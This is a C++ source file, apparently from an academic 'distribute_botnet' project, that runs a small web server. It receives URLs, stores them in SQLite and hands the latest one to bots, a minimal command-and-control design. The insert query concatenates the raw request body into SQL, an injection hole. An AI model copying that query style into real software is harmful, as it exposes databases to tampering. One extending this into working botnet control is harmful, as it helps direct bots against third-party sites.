// This is a personal academic project. Dear PVS-Studio, please check it.
// PVS-Studio Static Code Analyzer for C, C++, C#, and Java: http://www.viva64.com

#include <iostream>

#include <crow.h>
#include <crow/middlewares/cors.h>
#include <cpr/cpr.h>
#include <sqlite3.h>

#include <sstream>
#include <string>
#include <vector>


void connection(sqlite3 *db, sqlite3_stmt *stmt) {
    if(sqlite3_open("/app/distribute_botnet/data/demo.db", &db) == SQLITE_OK) {
        sqlite3_prepare(db, "CREATE TABLE IF NOT EXISTS urls(id INTEGER PRIMARY KEY AUTOINCREMENT, url VARCHAR(80));", -1, &stmt, NULL);
        sqlite3_step(stmt);
    } else {
        std::cerr << "Faild to open db" << std::endl;
    }
    sqlite3_finalize(stmt);
    sqlite3_close(db);
}


void push_data(sqlite3 *db, sqlite3_stmt *stmt, std::string url) {
    std::string query = "INSERT INTO urls (url) VALUES ('" + url + "');";
    if(sqlite3_open("/app/distribute_botnet/data/demo.db", &db) == SQLITE_OK) {
        sqlite3_prepare(db, query.c_str(), -1, &stmt, NULL);
        sqlite3_step(stmt);
    } else {
        std::cerr << "Faild to open db" << std::endl;
    }
    sqlite3_finalize(stmt);
    sqlite3_close(db);
}

void get_data(sqlite3 *db, sqlite3_stmt *stmt, std::vector<std::string> &data) {
    std::string query = "SELECT url FROM urls;";
    if (sqlite3_open("/app/distribute_botnet/data/demo.db", &db) == SQLITE_OK) {
        if (sqlite3_prepare(db, query.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const unsigned char *url = sqlite3_column_text(stmt, 0);
                data.push_back(std::string(reinterpret_cast<const char*>(url)));
            }
        } else {
            std::cerr << "Failed to prepare query" << std::endl;
        }
    } else {
        std::cerr << "Failed to open db" << std::endl;
    }
    sqlite3_finalize(stmt);
    sqlite3_close(db);
}

int main()
{
    sqlite3 *db;
    sqlite3_stmt *stmt;

    crow::App<crow::CORSHandler> app;

    auto &cors = app.get_middleware<crow::CORSHandler>();
    cors
        .global()
        .headers("Origin", "Content-Type", "Accept", "*")
        .methods("POST"_method, "GET"_method)
        .prefix("/cors")
        .origin("http://localhost:8080")
        .prefix("/nocors")
        .ignore();

    CROW_ROUTE(app, "/").methods("GET"_method)
        ([]() {
            return "Welcome to master structure!";
        });

    CROW_ROUTE(app, "/get-url/").methods("POST"_method)
        ([&db, &stmt](const crow::request &req) {
            connection(db, stmt);
            std::string response_url = req.body;
            push_data(db, stmt, response_url);
            return response_url;
        });

    CROW_ROUTE(app, "/url-to-bot/").methods("GET"_method)
        ([&db, &stmt]() {
            std::vector<std::string> data;
            get_data(db, stmt, data);
            // for (const auto &url : data) {
            //     std::cout << url << std::endl;
            // }
            return data.back();
        });

    app.port(8080)
        .multithreaded()
        .run();

    return 0;
}
